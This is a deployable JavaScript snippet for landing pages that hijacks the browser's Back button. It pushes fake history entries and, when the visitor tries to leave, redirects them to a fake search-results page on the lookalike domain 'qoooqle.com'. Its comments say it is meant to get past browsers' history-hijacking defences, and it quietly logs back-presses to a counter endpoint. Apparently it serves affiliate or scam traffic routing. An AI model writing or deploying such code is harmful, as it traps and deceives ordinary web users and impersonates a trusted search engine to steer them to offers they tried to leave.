/**
 * Backfix & Exit-Intent Redirect Script (Ravelizio Version)
 * 
 * Place this script right before </body> on the landing page.
 * It intercepts the back button and exit intent, using three triggers
 * to bypass modern browser history hijacking defenses.
 */
(function() {
    // google.php is shared, reusable infrastructure hosted standalone on its
    // own domain (like the newsnik pages) — reused across every future offer.
    var SERP_DOMAIN = 'qoooqle.com';

    var templateLang = '{{LANG}}';
    var langCode = templateLang;

    // If {{LANG}} wasn't replaced by generator, fallback to URL inspection
    if (templateLang === '{{' + 'LANG}}') {
        var pathParts = window.location.pathname.split('/');
        var inSubdir = pathParts.length > 2 && pathParts[pathParts.length - 2].length === 2;
        langCode = inSubdir ? pathParts[pathParts.length - 2] : 'en';
    }

    var templateBrand = '{{BRAND}}';
    var templateGeo = '{{GEO}}';
    var templateRegisterPath = '{{REGISTER_PATH}}';
    var templateAboutPath = '{{ABOUT_PATH}}';
    var brandName = (templateBrand !== '{{' + 'BRAND}}') ? templateBrand : '';
    var geoCode = (templateGeo !== '{{' + 'GEO}}') ? templateGeo : '';
    // These resolve at build time to "register.php"/"about.php" or "" (see
    // app.py's _render_placeholders) depending on whether the chosen
    // template actually has that page — forwarded so the standalone
    // google.php doesn't have to guess and risk linking to a 404.
    var registerPath = (templateRegisterPath !== '{{' + 'REGISTER_PATH}}') ? templateRegisterPath : 'register.php';
    var aboutPath = (templateAboutPath !== '{{' + 'ABOUT_PATH}}') ? templateAboutPath : 'about.php';

    // Build target search parameters for the shared SERP domain
    var searchParams = new URLSearchParams(window.location.search);
    searchParams.set('lang', langCode);
    searchParams.set('host', window.location.hostname);
    if (brandName) searchParams.set('brand', brandName);
    if (geoCode) searchParams.set('geo', geoCode);
    searchParams.set('register_path', registerPath);
    searchParams.set('about_path', aboutPath);

    // Deployed as index.php on the SERP domain (Keitaro's local_file action
    // only serves index.php regardless of the requested path).
    var targetUrl = 'https://' + SERP_DOMAIN + '/index.php?' + searchParams.toString();

    var currentPath = window.location.pathname;
    var pathParts = currentPath.split('/');
    var inSubdir = pathParts.length > 2 && pathParts[pathParts.length - 2].length === 2;

    var activated = false;

    // Activation logic: pushes history states and binds popstate listener
    function activateBackBlock() {
        if (activated) return;
        activated = true;
        console.log("[Backfix] Скрипт активирован! Записываем историю...");

        if (!targetUrl) {
            console.log("[Backfix] Ошибка: targetUrl пустой!");
            return;
        }

        /* --- OLD 15-LOOP VERSION (for rollback):
        for (var i = 0; i < 15; i++) {
            history.pushState(null, document.title, location.href);
        }
        window.addEventListener('popstate', function() {
            history.pushState(null, document.title, location.href);
            setTimeout(function() {
                location.replace(targetUrl);
            }, 0);
        });
        ------------------------------------------ */

        // NEW Ravelizio 2-state Pattern with Hash Bypass
        try {
            history.pushState({backfixed: 1}, "", location.href);
            history.pushState({backfixed: 2}, "", location.href + "#back");
            console.log("[Backfix] История с хэшем успешно записана. Ждем 'Назад'. Target: " + targetUrl);
        } catch (e) {
            console.log("[Backfix] Ошибка pushState: ", e);
        }

        window.addEventListener('popstate', function(event) {
            // Clicking a same-page hash link (e.g. <a href="#security">) also
            // fires popstate in every modern browser, but with state === null
            // (it's not one of the two states we pushed above). Only treat
            // this as a genuine back-button press when the browser hands back
            // our own {backfixed: 1} marker; otherwise let the click behave
            // normally instead of hijacking it into the SERP redirect.
            if (!event.state || event.state.backfixed !== 1) {
                console.log("[Backfix] popstate проигнорирован (не настоящая кнопка Назад): ", event.state);
                return;
            }

            console.log("[Backfix] Событие popstate (кнопка Назад нажата) перехвачено!");
            console.log("[Backfix] Перенаправляем на: " + targetUrl);

            try {
                if (navigator.sendBeacon) {
                    var backcountUrl = inSubdir ? "../backcount.php" : "backcount.php";
                    navigator.sendBeacon(backcountUrl, new Blob([], { type: 'text/plain' }));
                }
            } catch (e) {}

            setTimeout(function() {
                window.location.href = targetUrl;
            }, 50);
        });
    }

    // Activate on user interaction
    try {
        activateBackBlock();
    } catch(e) {}

    // --- Activation Triggers (Ravelizio Pattern) ---
    // 1. User clicks anywhere
    document.addEventListener('click', activateBackBlock, { once: true });
    
    // 2. User scrolls down > 10px
    window.addEventListener('scroll', function() {
        if (window.scrollY > 10) {
            activateBackBlock();
        }
    }, { once: true });

    // 3. Timeout: trigger after 2 seconds anyway
    setTimeout(activateBackBlock, 2000);

    // No automatic exit-intent redirect: only intercept browser back navigation.
})();
